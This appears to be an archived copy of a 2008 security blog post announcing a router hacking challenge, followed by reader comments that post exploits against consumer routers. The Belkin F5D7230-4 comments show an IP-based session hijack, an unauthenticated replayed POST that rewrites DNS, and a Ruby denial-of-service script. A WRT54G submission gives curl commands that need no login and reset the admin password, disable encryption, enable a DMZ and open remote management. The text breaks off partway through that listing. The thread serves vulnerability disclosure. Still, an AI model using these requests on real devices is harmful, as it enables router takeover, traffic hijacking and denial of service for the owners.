@@ -1,0 +1,2256 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/router-hacking-challenge/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:54:41 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; Router Hacking Challenge</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Router Hacking Challenge Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Hijacking OpenID enabled Accounts' href='../hijacking-openid-enabled-accounts/index.html' />
+<link rel='next' title='Holes in Embedded Devices: Desynchronized service acting as backdoor' href='../holes-in-embedded-devices-desynchronized-service-acting-as-backdoor/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../indexea0f.html?p=680' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-680" class="post">
+	<div class="post-title"><h2><span>Router Hacking Challenge</span></h2></div>
+	<div class="post-date"><span>published:</span> February 3rd, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>We want you to hack your router! Yes, You. We want you to hack your router and make your findings public on this very same page, the <a href="http://sla.ckers.org/forum/read.php?13,20128">sla.ckers</a> forum or at <em>hackerwebzine[at]gmail[dot]com</em>. The best and most interesting hacks will receive credit, a lot of attention and good media coverage.</p>
+
+<p>The challenge is supposed to run from 2nd February until 29th February, though it is something that is yet to be clarified because we know that there is a lot to be found.</p>
+
+<p>The reason why we do this is because we want you to help the community to map the current state of embedded devices vulnerabilities. GNUCITIZEN members <a href="../hacking-the-interwebs/index.html">have</a> <a href="../call-jacking-phreaking-the-bt-home-hub/index.html">been</a> <a href="../bt-home-flub-pwnin-the-bt-home-hub/index.html">actively</a> <a href="../security-and-hacking-scene-in-london/index.html">involved</a> with finding vulnerabilities in routers in the past. We believe that embedded devices hacking is a huge topic that is yet to be explored in depth. Your submissions will be included in numerous presentations and research materials and will be credited appropriately.</p>
+
+<p><em>The rules are very flexible, every kind of exploit is allowed: from buffer overflows to CSRF issues that plague many routers.</em></p><div class="single-content-bottom-widgets"></div></div>
+		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/challange/index.html" rel="tag">challange</a> | <a href="../../tags/hacking/index.html" rel="tag">hacking</a> | <a href="../../tags/router/index.html" rel="tag">router</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-109038">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/93ea97e27eab21ae8e4c7c33a04b15fd?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">udi</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109038">
+			February 4, 2008 at 9:33 am</a>		</div>
+
+		<p>i have cisco 2514 and im willing to open it for public via telnet.</p>
+<p>please comment.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-109062">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109062">
+			February 4, 2008 at 10:04 am</a>		</div>
+
+		<p>udi, this is an interesting proposal but we are interested in you hacking your own appliance. send us your findings and we will publish them among the best hacks.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-109107">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/4ae1ef77752857ddba8f31b247961386?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://projectbee.org/' rel='external nofollow' class='url'>Bipin Upadhyay</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109107">
+			February 4, 2008 at 10:28 am</a>		</div>
+
+		<p>MoRB (Month of Router Bugs) eh! :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-109108">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109108">
+			February 4, 2008 at 10:35 am</a>		</div>
+
+		<p>Bipin, I guess so although it is kind of more distributed and slightly more playful. The main idea is to get a good picture of what&#8217;s going on at the moment when it comes to router hacking. Feel free to advertise it as MoRB :) just to get people to join our friendly challenge although make sure that people should not expect having one vulnerability per day. The more people participate with their router hacks the more vulnerabilities we will be able to outline.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-109472">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/691de8da509e7f1d427c69339b8facbb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">loftgaia</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109472">
+			February 4, 2008 at 8:43 pm</a>		</div>
+
+		<pre><code>Manufacturer:Belkin
+Router model:F5D7230-4
+
+I have found a weekness in the way this router maintains access to the control panel.
+
+After a user enters the password sucessfuly in the control center,the router maintains access just by checking the ipaddress. 
+
+Lets suppose i have two computers in my LAN:
+PC1-192.168.2.3
+PC2-192.168.2.5
+
+I login to the control panel of the router with PC1.
+With PC2 i just need to change my IP address:
+ifconfig eth0 192.168.2.3
+
+and then i can change any settings in the router with PC2: DNS settings,firewall rules,ip forwarding,etc..
+
+No big deal,but works lol.</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-109477">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109477">
+			February 4, 2008 at 8:50 pm</a>		</div>
+
+		<p>loftgaia, 10x for participating. so basically the router is vulnerable to one of these IP-based session management attacks, Adrian was <a href="../holes-in-embedded-devices-ip-based-session-management/index.html" rel="nofollow">talking</a> about.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-109479">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109479">
+			February 4, 2008 at 8:54 pm</a>		</div>
+
+		<p><a href="http://sla.ckers.org/forum/profile.php?13,1758" rel="nofollow">dzman</a> has submitted the following <a href="http://sla.ckers.org/forum/read.php?13,20128" rel="nofollow">entry</a>:</p>
+<pre><code>I've had some fun with my router: LinkSys WRT300N Firmware Version: 2.00.20
+Basically it uses XSS, the user does need to be logged into the admin area of the router for this to work.
+
+This will fetch the username/password of my PPPoE login, but with small modifications you can steal/adjust anything you want.
+
+Does not work in IE, probably some small problem but I don't use IE so whatever.
+Firefox and Safari are ok.
+
+Html file:
+<a href="http://code.bulix.org/cx46qa-65489" rel="nofollow">[code.bulix.org]</a>
+
+Javascript file:
+<a href="http://code.bulix.org/koom78-65490" rel="nofollow">[code.bulix.org]</a></code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac odd alt thread-odd thread-alt depth-1" id="comment-109609">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109609">
+			February 4, 2008 at 11:55 pm</a>		</div>
+
+		<p>Come on guys, keep the hacks coming! There are literally MANY issues affecting embedded devices, many of which do *not* require low-level reverse engineering skills to be discovered.</p>
+<p>loftgaia, that sounds like a IP-based session management vulnerability. It&#8217;s really concerning how many devices blindly trust the admin&#8217;s source IP address after logging in, for authentication state reasons! Corporate networks sharing proxies are definitively at risk on this one.</p>
+<p>Also guys, we need to remember that the definition &#8220;consumer grade&#8221; devices is becoming very blurry these days as these &#8220;home&#8221; devices are also used by companies in SOHO networks. Exciting topic indeed!</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-109640">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/676b588b1a7a24ddfc6f5b11b90a0513?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">patrick</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109640">
+			February 5, 2008 at 1:08 am</a>		</div>
+
+		<p>@loftgaia: I have the same one and I noticed that the password is not encrypted. If you go to the systems settings and open the source, search for &#8220;http_passwd&#8221;. It&#8217;s a hidden input field. The password is stored in plaintext and you can easily change it without knowing it. You need to be logged in to view it, but since you can now hijack the session you can easily take control.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-109672">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/691de8da509e7f1d427c69339b8facbb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">loftgaia</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109672">
+			February 5, 2008 at 2:14 am</a>		</div>
+
+		<pre><code>Sorry for double posting but the situation turned out to be worst than i first thought.
+
+I now have managed to change router configuration options without even logging in. If I try to access the html pages of the router it will ask for a password,but not the script that handles the request itself.So we just need to replay the http packets that actually perform the action.
+
+<strong>*No* authentication or spoofing is required.</strong>
+
+HTTP headers:
+
+POST /cgi-bin/setup_dns.exe
+Host: 192.168.2.1
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http&#58;//192.168.2.1/setup_dns.stm
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+HTTP body:
+page=setup_dns&amp;logout=&amp;dns1_1=1&amp;dns1_2=1&amp;dns1_3=1&amp;dns1_4=1&amp;dns2_1=2&amp;dns2_2=2&amp;dns2_3=2&amp;dns2_4=2
+
+After sending this the primary DNS server IP-address will get changed to 1.1.1.1 and secondary DNS server to 2.2.2.2 . I have tried changing other options without password and it worked all the time,disable firewall,reset to factory defaults,etc.. The page will still ask for a password...too bad the script didn't.This can obviously be triggered remotely for at least a couple of ways.
+
+<a href="http://d4.myfreefilehosting.com/d1/belkin.html" rel="nofollow">belkin.html</a>:
+	Belkin Wireless G router F5D7230-4 Hole
+
+we can load in an iframe for example:
+	<a href="http://d2.myfreefilehosting.com/d1/page1.html" rel="nofollow">page1.html</a>
+
+Tomorrow i will be bying a new router.</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-109892">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/691de8da509e7f1d427c69339b8facbb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">loftgaia</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109892">
+			February 5, 2008 at 9:28 am</a>		</div>
+
+		<pre><code>Found another one.This time it only causes a DOS.
+
+<a href="http://d2.myfreefilehosting.com/d1/panel_dos.rb" rel="nofollow">http://d2.myfreefilehosting.com/d1/panel_dos.rb</a>
+
+#!/usr/bin/env ruby
+#Author:loftgaia
+#Router: Belkin Wireless G Router F5D7230-4
+#After running this script nobody in the LAN
+#will be able to connect to the router control center.
+#A router restart is required to resume normal operation.
+#Internet traffic is still allowed to pass through ,this only causes a
+#DOS on the control center.
+
+#If we send a POST request with a Keep-Alive
+#header plus some random content in the body and
+#immediately close the socket,any connections to
+#the control center, from that point on are just
+#dropped by the router from *any* source.
+
+require 'socket'
+
+sock = TCPSocket.new("192.168.2.1",80)
+request = &lt;&lt;EOF
+POST /cgi-bin/setup_virtualserver.exe HTTP/1.1
+Host: 192.168.2.1
+Keep-Alive: 50
+Connection: Keep-Alive
+Content-Type: text/plain
+Content-Length: 10
+ansdfert=1
+EOF
+
+request.gsub!("&#92;n","&#92;r&#92;n")
+
+puts sock.write(request).to_s + " written&#92;n"
+
+sock.close</code></pre>
+<p></code</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-109898">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/271ecedbd232e23677ddc1d3956147eb?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://hackathology.blogspot.com/' rel='external nofollow' class='url'>hackathology</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-109898">
+			February 5, 2008 at 9:32 am</a>		</div>
+
+		<p>Check out my blog on the latest post. Basically there is a design flaw in CISCO firewall products.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-110130">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../application-layer-anti-virusfirewall/index.html' rel='external nofollow' class='url'>Adrian Pastor</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110130">
+			February 5, 2008 at 4:42 pm</a>		</div>
+
+		<p>@loftgaia &#8211; that auth bypass reminds me of the one found by Ginsu Rabbit on Linksys WRT54g home router, firmware revision 1.00.9: <a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded" rel="nofollow">http://www.securityfocus.com/a.....0/threaded</a></p>
+<p>This is what I like to call an &#8220;unprotected requests&#8221; authentication bypass vulnerability which I discussed on my &#8220;Cracking into embedded devices and beyond!&#8221; presentation:</p>
+<p><a href="../security-and-hacking-scene-in-london/cracking-into-embedded-devices-and-beyond.html" rel="nofollow">http://www.gnucitizen.org/blog.....beyond.pdf</a></p>
+<p>However, way more material on this topic, including new tools and techniques will be presented at HITB Dubai: <a href="http://conference.hackinthebox.org/hitbsecconf2008dubai/?page_id=186" rel="nofollow">http://conference.hackinthebox.....age_id=186</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-110179">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bb236a05eb6a86e4b3364cd0a71001c8?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kinqpinz.info/' rel='external nofollow' class='url'>meathive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110179">
+			February 5, 2008 at 6:50 pm</a>		</div>
+
+		<p>I&#8217;m still working on this stuff so I&#8217;ve changed the URL I&#8217;ve supplied you (HackerWebzine).</p>
+<p>You may now find it here: <a href="http://kinqpinz.info/lib/wrt54g/own.txt" rel="nofollow">http://kinqpinz.info/lib/wrt54g/own.txt</a><br />
+I&#8217;ve also now got live demos running at: <a href="http://kinqpinz.info/lib/wrt54g/" rel="nofollow">http://kinqpinz.info/lib/wrt54g/</a></p>
+<p>If you&#8217;re running the same router or know someone who does, have them try these submissions and post their results.</p>
+<p>Greets,<br />
+meathive</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor even thread-even depth-1" id="comment-110198">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110198">
+			February 5, 2008 at 7:44 pm</a>		</div>
+
+		<p>meathive, 10x for participating</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-pdp bypostauthor odd alt thread-odd thread-alt depth-1" id="comment-110200">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../about/pdp.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-110200">
+			February 5, 2008 at 7:46 pm</a>		</div>
+
+		<p>meathive, submission follows:</p>
+<pre><code>regurgitated by: meathive
+                                                       url: kinqpinz.info ;]
+				             Tue, 05 Feb 2008 07:51:41 -0700
+############################################################################
+WRT54G firmware version: v1.00.9
+Default LAN IP: 192.168.1.1
+Default auth: user:blank - pass:admin
+Authorization: Basic OmFkbWlu
+php &gt; print base64_decode("OmFkbWlu");
+:admin
+############################################################################
+
+                        /******************************
+			* No Authentication Required! *
+			******************************/
+
+############################################################################
+What:
+restore basic setup options to default.
+
+Where:
+http&#58;//192.168.1.1/Basic.tri?dhcp_end=149&#038;oldMtu=1500&#038;oldLanSubnet=0&#038;OldWanMode=0&#038;SDHCP1=192&#038;SDHCP2=168&#038;SDHCP3=1&#038;SDHCP4=100&#038;EDHCP1=192&#038;EDHCP2=168&#038;EDHCP3=1&#038;EDHCP4=150&#038;pd=&#038;now_proto=dhcp&#038;old_domain=&#038;chg_lanip=192.168.1.1&#038;_daylight_time=1&#038;wan_proto=0&#038;router_name=WRT54G&#038;wan_hostname=&#038;wan_domain=&#038;mtu_enable=0&#038;lan_ipaddr_0=192&#038;lan_ipaddr_1=168&#038;lan_ipaddr_2=1&#038;lan_ipaddr_3=1&#038;lan_netmask=0&#038;lan_proto=Enable&#038;dhcp_start=100&#038;dhcp_num=50&#038;dhcp_lease=0&#038;dns0_0=0&#038;dns0_1=0&#038;dns0_2=0&#038;dns0_3=0&#038;dns1_0=0&#038;dns1_1=0&#038;dns1_2=0&#038;dns1_3=0&#038;dns2_0=0&#038;dns2_1=0&#038;dns2_2=0&#038;dns2_3=0&#038;wins_0=0&#038;wins_1=0&#038;wins_2=0&#038;wins_3=0&#038;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&#038;daylight_time=ON&#038;layout=en
+
+How:
+curl -d "dhcp_end=149&#038;oldMtu=1500&#038;oldLanSubnet=0&#038;OldWanMode=0&#038;SDHCP1=192&#038;SDHCP2=168&#038;SDHCP3=1&#038;SDHCP4=100&#038;EDHCP1=192&#038;EDHCP2=168&#038;EDHCP3=1&#038;EDHCP4=150&#038;pd=&#038;now_proto=dhcp&#038;old_domain=&#038;chg_lanip=192.168.1.1&#038;_daylight_time=1&#038;wan_proto=0&#038;router_name=WRT54G&#038;wan_hostname=&#038;wan_domain=&#038;mtu_enable=0&#038;lan_ipaddr_0=192&#038;lan_ipaddr_1=168&#038;lan_ipaddr_2=1&#038;lan_ipaddr_3=1&#038;lan_netmask=0&#038;lan_proto=Enable&#038;dhcp_start=100&#038;dhcp_num=50&#038;dhcp_lease=0&#038;dns0_0=0&#038;dns0_1=0&#038;dns0_2=0&#038;dns0_3=0&#038;dns1_0=0&#038;dns1_1=0&#038;dns1_2=0&#038;dns1_3=0&#038;dns2_0=0&#038;dns2_1=0&#038;dns2_2=0&#038;dns2_3=0&#038;wins_0=0&#038;wins_1=0&#038;wins_2=0&#038;wins_3=0&#038;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&#038;daylight_time=ON&#038;layout=en" http&#58;//192.168.1.1/Basic.tri
+############################################################################
+What:
+reset administrative password to 'asdf'.
+
+Where:
+http&#58;//192.168.1.1/manage.tri?remote_mgt_https=0&#038;http_enable=1&#038;https_enable=0&#038;PasswdModify=1&#038;http_passwd=asdf&#038;http_passwdConfirm=asdf&#038;_http_enable=1&#038;web_wl_filter=1&#038;remote_management=0&#038;upnp_enable=1&#038;layout=en
+
+How:
+curl -d "remote_mgt_https=0&#038;http_enable=1&#038;https_enable=0&#038;PasswdModify=1&#038;http_passwd=asdf&#038;http_passwdConfirm=asdf&#038;_http_enable=1&#038;web_wl_filter=1&#038;remote_management=0&#038;upnp_enable=1&#038;layout=en" http&#58;//192.168.1.1/manage.tri
+############################################################################
+What:
+enable mixed wireless network mode with SSID 'pwnage' on channel 6, SSID broadcasting enabled.
+
+Where:
+http&#58;//192.168.1.1/WBasic.tri?submit_type=&#038;channelno=11&#038;OldWirelessMode=3&#038;Mode=3&#038;SSID=pwnage&#038;channel=6&#038;Freq=6&#038;wl_closed=1&#038;sesMode=1&#038;layout=en
+
+How:
+curl -d "submit_type=&#038;channelno=11&#038;OldWirelessMode=3&#038;Mode=3&#038;SSID=pwnage&#038;channel=6&#038;Freq=6&#038;wl_closed=1&#038;sesMode=1&#038;layout=en" http&#58;//192.168.1.1/WBasic.tri
+############################################################################
+What:
+disable all wireless encryption.
+
+Where:
+http&#58;//192.168.1.1/Security.tri?SecurityMode=0&#038;layout=en
+
+How:
+curl -d "SecurityMode=0&#038;layout=en" http&#58;//192.168.1.1/Security.tri
+############################################################################
+What:
+disable wireless MAC filtering.
+
+Where:
+http&#58;//192.168.1.1/WFilter.tri?wl_macmode1=0
+
+How:
+curl -d "wl_macmode1=0" http&#58;//192.168.1.1/WFilter.tri
+############################################################################
+What:
+enable DMZ to ip 192.168.1.100.
+
+Where:
+http&#58;//192.168.1.1/dmz.tri?action=Apply&#038;dmz_enable=1&#038;dmz_ipaddr=100&#038;layout=en
+
+How:
+curl -d "action=Apply&#038;dmz_enable=1&#038;dmz_ipaddr=100&#038;layout=en" http&#58;//192.168.1.1/dmz.tri
+############################################################################
+What:
+disable DMZ.
+
+Where:
+http&#58;//192.168.1.1/dmz.tri?action=Apply&#038;dmz_enable=0&#038;layout=en
+
+How:
+curl -d "action=Apply&#038;dmz_enable=0&#038;layout=en" http&#58;//192.168.1.1/dmz.tri
+############################################################################
+What:
+enable remote management on port 31337 with password 'asdf', wireless web access and UPnP enabled.
+
+Where:
+http&#58;//192.168.1.1/manage.tri?remote_mgt_https=0&#038;http_enable=1&#038;https_enable=0&#038;PasswdModify=1&#038;http_passwd=asdf&#038;http_passwdConfirm=asdf&#038;_http_enable=1&#038;web_wl_filter=1&#038;remote_management=1&#038;http_wanport=31337&#038;upnp_enable=1&#038;layout=en
+
+How:
+curl -d "remote_mgt_https=0&#038;http_enable=1&#038;https_enable=0&#038;PasswdModify=1&#038;http_passwd=asdf&#038;http_passwdConfirm=asdf&#038;_http_enable=1&#038;web_wl_filter=1&#038;remote_management=1&#038;http_wanport=31337&#038;upnp_enable=1&#038;layout=en" http&#58;//192.168.1.1/manage.tri
+############################################################################
+
+                        /******************************
+			******      Defaults:    ******
+			******************************/
+
+############################################################################
+Setup-&gt;Basic Setup:
+POST /Basic.tri dhcp_end=149&#038;oldMtu=1500&#038;oldLanSubnet=0&#038;OldWanMode=0&#038;SDHCP1=192&#038;SDHCP2=168&#038;SDHCP3=1&#038;SDHCP4=100&#038;EDHCP1=192&#038;EDHCP2=168&#038;EDHCP3=1&#038;EDHCP4=150&#038;pd=&#038;now_proto=dhcp&#038;old_domain=&#038;chg_lanip=192.168.1.1&#038;_daylight_time=1&#038;wan_proto=0&#038;router_name=WRT54G&#038;wan_hostname=&#038;wan_domain=&#038;mtu_enable=0&#038;lan_ipaddr_0=192&#038;lan_ipaddr_1=168&#038;lan_ipaddr_2=1&#038;lan_ipaddr_3=1&#038;lan_netmask=0&#038;lan_proto=Enable&#038;dhcp_start=100&#038;dhcp_num=50&#038;dhcp_lease=0&#038;dns0_0=0&#038;dns0_1=0&#038;dns0_2=0&#038;dns0_3=0&#038;dns1_0=0&#038;dns1_1=0&#038;dns1_2=0&#038;dns1_3=0&#038;dns2_0=0&#038;dns2_1=0&#038;dns2_2=0&#038;dns2_3=0&#038;wins_0=0&#038;wins_1=0&#038;wins_2=0&#038;wins_3=0&#038;time_zone=%28GMT-08%3A00%29+Pacific+Time+%28USA+%26+Canada%29&#038;daylight_time=ON&#038;layout=en
+############################################################################
+Setup-&gt;DDNS:
+POST /ddns.tri ddns_enable=0
+############################################################################
+Setup-&gt;MAC Address Clone:
+POST /WanMac.tri action=Apply&#038;mac_clone_enable=0
+############################################################################
+Setup-&gt;Advanced Routing:
